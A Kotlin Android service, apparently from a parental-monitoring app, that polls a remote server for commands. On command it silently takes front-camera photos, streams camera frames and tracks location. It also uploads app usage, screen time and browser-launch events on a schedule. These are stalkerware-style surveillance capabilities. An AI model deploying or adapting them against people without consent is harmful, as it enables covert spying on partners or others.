package com.familysafety.app

import android.app.AppOpsManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Matrix
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.util.Base64
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

class FamilySafetyService : LifecycleService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var trackingJob: Job? = null
    private var streamJob: Job? = null
    private var imageCapture: ImageCapture? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val isSendingFrame = AtomicBoolean(false)

    companion object {
        private const val TAG = "FamilySafetyService"
        private const val CHANNEL_ID = "family_safety"
        private const val NOTIF_ID = 1
        const val PREFS_NAME = "family_safety"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_CHILD_NAME = "child_name"
        const val KEY_DEVICE_ID = "device_id"
        const val EXTRA_SERVER_URL = "extra_server_url"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        val url = intent?.getStringExtra(EXTRA_SERVER_URL)
            ?: prefs.getString(KEY_SERVER_URL, "") ?: ""
        if (url.isNotBlank()) {
            ApiClient.serverUrl = url
            prefs.edit().putString(KEY_SERVER_URL, url).apply()
        }

        var deviceId = prefs.getString(KEY_DEVICE_ID, null)
        if (deviceId.isNullOrBlank()) {
            deviceId = UUID.randomUUID().toString()
            prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
        }
        ApiClient.deviceId = deviceId
        ApiClient.childName = prefs.getString(KEY_CHILD_NAME, "") ?: ""

        setupCamera()
        startMainLoop()
        startAutoReportLoop()
        return START_STICKY
    }

    override fun onDestroy() {
        scope.cancel()
        cameraProvider?.unbindAll()
        cameraExecutor.shutdown()
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Family Safety", NotificationManager.IMPORTANCE_LOW
        ).apply { description = "Family Safety monitoring service" }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun buildNotification() = androidx.core.app.NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Family Safety")
        .setContentText("Monitoring active")
        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
        .setOngoing(true)
        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW)
        .build()

    private fun setupCamera() {
        scope.launch(Dispatchers.Main) {
            try {
                cameraProvider = suspendCancellableCoroutine { cont ->
                    val future = ProcessCameraProvider.getInstance(this@FamilySafetyService)
                    future.addListener({
                        try { cont.resume(future.get()) }
                        catch (e: Exception) { cont.resumeWithException(e) }
                    }, ContextCompat.getMainExecutor(this@FamilySafetyService))
                }
                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                imageAnalysis = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST).build()
                val selector = CameraSelector.Builder()
                    .requireLensFacing(CameraSelector.LENS_FACING_FRONT).build()
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(
                    this@FamilySafetyService, selector, imageCapture, imageAnalysis
                )
            } catch (e: Exception) {
                Log.e(TAG, "Camera setup failed: ${e.message}")
            }
        }
    }

    private fun startMainLoop() {
        scope.launch {
            while (isActive) {
                try {
                    when (ApiClient.getCommand()) {
                        "get_location"   -> sendLocation()
                        "take_photo"     -> takePhoto()
                        "start_tracking" -> startTracking()
                        "stop_tracking"  -> stopTracking()
                        "get_status"     -> sendStatus()
                        "start_stream"   -> startStream()
                        "stop_stream"    -> stopStream()
                    }
                } catch (e: Exception) { Log.e(TAG, "Loop error: ${e.message}") }
                delay(10_000)
            }
        }
    }

    private fun startAutoReportLoop() {
        scope.launch {
            while (isActive) {
                try { sendActiveApp(); sendScreenTime() }
                catch (e: Exception) { Log.e(TAG, "Report error: ${e.message}") }
                delay(30_000)
            }
        }
        scope.launch {
            while (isActive) {
                try { sendBrowserHistory() }
                catch (e: Exception) { Log.e(TAG, "Browser error: ${e.message}") }
                delay(60_000)
            }
        }
    }

    private suspend fun sendLocation() {
        try {
            val client = LocationServices.getFusedLocationProviderClient(this)
            val cts = CancellationTokenSource()
            val loc = suspendCancellableCoroutine { cont ->
                client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cts.token)
                    .addOnSuccessListener { cont.resume(it) }
                    .addOnFailureListener { cont.resumeWithException(it) }
                cont.invokeOnCancellation { cts.cancel() }
            }
            if (loc != null) {
                ApiClient.postJson("/api/location",
                    """{"lat":${loc.latitude},"lon":${loc.longitude},"accuracy":${loc.accuracy},"timestamp":"${isoNow()}"}""".trimIndent())
            }
        } catch (e: Exception) { Log.e(TAG, "Location: ${e.message}") }
    }

    private fun startTracking() {
        if (trackingJob?.isActive == true) return
        trackingJob = scope.launch { while (isActive) { sendLocation(); delay(30_000) } }
    }

    private fun stopTracking() { trackingJob?.cancel() }

    private suspend fun takePhoto() {
        val capture = imageCapture ?: return
        val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        suspendCancellableCoroutine { cont ->
            capture.takePicture(
                ImageCapture.OutputFileOptions.Builder(file).build(), cameraExecutor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(o: ImageCapture.OutputFileResults) = cont.resume(Unit)
                    override fun onError(e: ImageCaptureException) = cont.resumeWithException(e)
                }
            )
        }
        if (file.exists()) { ApiClient.postPhoto(file); file.delete() }
    }

    private fun startStream() {
        if (streamJob?.isActive == true) return
        val analysis = imageAnalysis ?: return
        streamJob = scope.launch {
            analysis.setAnalyzer(cameraExecutor) { proxy ->
                if (!isSendingFrame.compareAndSet(false, true)) {
                    proxy.close()
                    return@setAnalyzer
                }
                try {
                    val b64 = proxyToBase64(proxy)
                    proxy.close()
                    scope.launch {
                        try { ApiClient.postFrame(b64) }
                        finally { isSendingFrame.set(false) }
                    }
                } catch (e: Exception) {
                    proxy.close()
                    isSendingFrame.set(false)
                }
            }
        }
    }

    private fun stopStream() {
        streamJob?.cancel()
        imageAnalysis?.clearAnalyzer()
        isSendingFrame.set(false)
    }

    private fun proxyToBase64(proxy: ImageProxy): String {
        val bitmap = proxy.toBitmap()
        val rotation = proxy.imageInfo.rotationDegrees
        val finalBitmap = if (rotation != 0) {
            val matrix = Matrix().apply { postRotate(rotation.toFloat()) }
            Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
        } else {
            bitmap
        }
        val ratio = 320f / finalBitmap.width
        val scaled = Bitmap.createScaledBitmap(finalBitmap, 320, (finalBitmap.height * ratio).toInt(), true)
        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, 40, out)
        return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    }

    private fun sendStatus() {
        val bm = getSystemService(BatteryManager::class.java)
        val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val cm = getSystemService(ConnectivityManager::class.java)
        val wifi = cm.getNetworkCapabilities(cm.activeNetwork)
            ?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false
        ApiClient.postJson("/api/status",
            """{"battery":$battery,"wifi":$wifi,"timestamp":"${isoNow()}"}""".trimIndent())
    }

    private fun sendActiveApp() {
        if (!hasUsagePermission()) return
        try {
            val usm = getSystemService(UsageStatsManager::class.java)
            val now = System.currentTimeMillis()
            val events = usm.queryEvents(now - 5000, now)
            val event = UsageEvents.Event()
            var lastPkg = ""
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) lastPkg = event.packageName
            }
            if (lastPkg.isBlank()) return
            val name = try {
                packageManager.getApplicationLabel(packageManager.getApplicationInfo(lastPkg, 0)).toString()
            } catch (e: Exception) { lastPkg }
            ApiClient.postJson("/api/active-app",
                """{"app_name":"${name.replace("\"", "")}","app_package":"$lastPkg","timestamp":"${isoNow()}"}""".trimIndent())
        } catch (e: Exception) { Log.e(TAG, "ActiveApp: ${e.message}") }
    }

    private fun sendScreenTime() {
        if (!hasUsagePermission()) return
        try {
            val usm = getSystemService(UsageStatsManager::class.java)
            val cal = Calendar.getInstance().apply {
                set(Calendar.HOUR_OF_DAY, 0); set(Calendar.MINUTE, 0)
                set(Calendar.SECOND, 0); set(Calendar.MILLISECOND, 0)
            }
            val apps = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, cal.timeInMillis, System.currentTimeMillis()
            ).filter { it.totalTimeInForeground > 0 }
                .sortedByDescending { it.totalTimeInForeground }.take(10)
                .map { s ->
                    val n = try { packageManager.getApplicationLabel(
                        packageManager.getApplicationInfo(s.packageName, 0)).toString().replace("\"", "")
                    } catch (e: Exception) { s.packageName }
                    """{"name":"$n","package":"${s.packageName}","minutes":${s.totalTimeInForeground / 60000}}"""
                }
            ApiClient.postJson("/api/screen-time",
                """{"apps":[${apps.joinToString(",")}],"timestamp":"${isoNow()}"}""".trimIndent())
        } catch (e: Exception) { Log.e(TAG, "ScreenTime: ${e.message}") }
    }

    private fun sendBrowserHistory() {
        if (!hasUsagePermission()) return
        try {
            val usm = getSystemService(UsageStatsManager::class.java)
            val now = System.currentTimeMillis()
            val events = usm.queryEvents(now - 3_600_000, now)
            val event = UsageEvents.Event()
            val browsers = setOf("com.android.chrome", "org.mozilla.firefox", "com.opera.browser", "com.microsoft.emmx")
            val entries = mutableListOf<String>()
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND && event.packageName in browsers) {
                    val n = try { packageManager.getApplicationLabel(
                        packageManager.getApplicationInfo(event.packageName, 0)).toString() }
                    catch (e: Exception) { event.packageName }
                    val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(event.timeStamp))
                    entries.add("""{"url":"${n.replace("\"", "")}","title":"Browser opened","timestamp":"$ts"}""")
                }
            }
            ApiClient.postJson("/api/browser-history",
                """{"sites":[${entries.takeLast(20).joinToString(",")}],"count":${entries.size},"timestamp":"${isoNow()}"}""".trimIndent())
        } catch (e: Exception) { Log.e(TAG, "BrowserHistory: ${e.message}") }
    }

    private fun hasUsagePermission(): Boolean {
        val aom = getSystemService(AppOpsManager::class.java)
        return aom.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName
        ) == AppOpsManager.MODE_ALLOWED
    }

    private fun isoNow() = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
}
